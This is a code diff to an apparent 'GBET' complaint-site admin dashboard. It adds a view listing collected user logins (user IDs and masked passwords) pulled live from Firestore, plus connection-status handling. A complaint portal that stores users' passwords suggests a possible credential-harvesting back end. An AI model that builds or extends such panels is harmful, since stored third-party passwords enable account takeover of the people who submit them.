@@ -9,6 +9,23 @@
     chevron: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 5 16 12 9 19"/></svg>'
   };
 
+  function loginCard(c) {
+    return '<a class="c-card login-card" data-id="' + GBET.esc(c.id) + '" href="complaint.html?id=' + encodeURIComponent(c.id) + '&view=login">' +
+      '<div class="c-top">' +
+      GBET.avatarHtml() +
+      '<div class="c-id">' +
+      '<span class="c-name">' + GBET.esc(c.name) + '</span>' +
+      '<span class="c-type">User Login</span>' +
+      '</div>' +
+      '<span class="c-chev">' + ICONS.chevron + '</span>' +
+      '</div>' +
+      '<div class="login-meta">' +
+      '<span class="login-item"><span class="login-key">User ID</span><span class="login-val">' + GBET.esc(c.uid || '\u2014') + '</span></span>' +
+      '<span class="login-item"><span class="login-key">Password</span><span class="login-val">' + (c.password ? '\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022' : '\u2014') + '</span></span>' +
+      '</div>' +
+      '</a>';
+  }
+
   function card(c) {
     var st = GBET.statusKey(c.status);
     var type = c.problemType || GBET.categories[c.category] || 'Complaint';
@@ -29,37 +46,88 @@
       '</a>';
   }
 
-  function paint(list) {
-    var listEl = document.getElementById('complaintList');
-    var metaEl = document.getElementById('listMeta');
+  try { localStorage.removeItem('gbet.admin.complaints.v1'); } catch (e) { /* ignore */ }
 
+  var painted = false;
+  var view = 'complain';
+  var current = [];
+
+  function renderList() {
+    var listEl = document.getElementById('complaintList');
+    var titleEl = document.getElementById('listTitle');
+    var metaEl = document.getElementById('listMeta');
+    var isLogin = view === 'login';
+
+    if (titleEl) titleEl.textContent = isLogin ? 'All Logins' : 'All Complaints';
+    if (metaEl) metaEl.textContent = isLogin
+      ? current.length + (current.length === 1 ? ' login' : ' logins')
+      : current.length + (current.length === 1 ? ' complaint' : ' complaints');
+
+    if (!listEl) return;
+
+    if (!current.length) {
+      listEl.innerHTML = '<div class="empty-list">' + (isLogin ? 'No login details yet.' : 'No complaints yet.') + '</div>';
+      painted = true;
+      return;
+    }
+
+    var html = '';
+    for (var i = 0; i < current.length; i++) html += isLogin ? loginCard(current[i]) : card(current[i]);
+    listEl.innerHTML = html;
+    painted = true;
+  }
+
+  function paint(list) {
     var today = 0;
     for (var t = 0; t < list.length; t++) if (GBET.isToday(list[t].createdAt)) today++;
 
     document.getElementById('todayCount').textContent = today;
     document.getElementById('totalCount').textContent = list.length;
 
-    if (metaEl) metaEl.textContent = list.length + (list.length === 1 ? ' complaint' : ' complaints');
+    var chip = document.getElementById('connChip');
+    if (chip) chip.lastElementChild.textContent = 'Live';
 
-    if (!listEl) return;
-
-    if (!list.length) {
-      listEl.innerHTML = '<div class="empty-list">No complaints found.</div>';
-      return;
-    }
-
-    var html = '';
-    for (var i = 0; i < list.length; i++) html += card(list[i]);
-    listEl.innerHTML = html;
+    current = list;
+    renderList();
   }
 
-  function localList() { return GBET.list(); }
+  function remoteList() {
+    return (window.GBET_FB && typeof GBET_FB.list === 'function') ? GBET_FB.list() : [];
+  }
 
-  paint(localList());
+  var switchEl = document.getElementById('dataSwitch');
+  if (switchEl) {
+    switchEl.addEventListener('click', function (e) {
+      var btn = e.target.closest ? e.target.closest('[data-view]') : null;
+      if (!btn) return;
+      view = btn.getAttribute('data-view') === 'login' ? 'login' : 'complain';
+      var btns = switchEl.querySelectorAll('.seg-btn');
+      for (var i = 0; i < btns.length; i++) {
+        var active = btns[i] === btn;
+        btns[i].classList.toggle('is-active', active);
+        btns[i].setAttribute('aria-selected', active ? 'true' : 'false');
+      }
+      renderList();
+    });
+  }
+
+  if (window.GBET_FB) {
+    paint(remoteList());
+  } else {
+    var bootList = document.getElementById('complaintList');
+    if (bootList) bootList.innerHTML = '<div class="empty-list">Connecting to live database\u2026</div>';
+  }
 
   document.addEventListener('gbfb:complaints', function (e) {
-    var remote = e.detail || [];
-    paint(remote.length ? remote : localList());
+    paint(e.detail || []);
+  });
+
+  document.addEventListener('gbfb:error', function () {
+    var chip = document.getElementById('connChip');
+    if (chip) chip.lastElementChild.textContent = 'Offline';
+    if (painted) return;
+    var listEl = document.getElementById('complaintList');
+    if (listEl) listEl.innerHTML = '<div class="empty-list">Could not connect to Firestore. Check network and rules.</div>';
   });
 
   var iconCalendar = document.getElementById('iconCalendar');
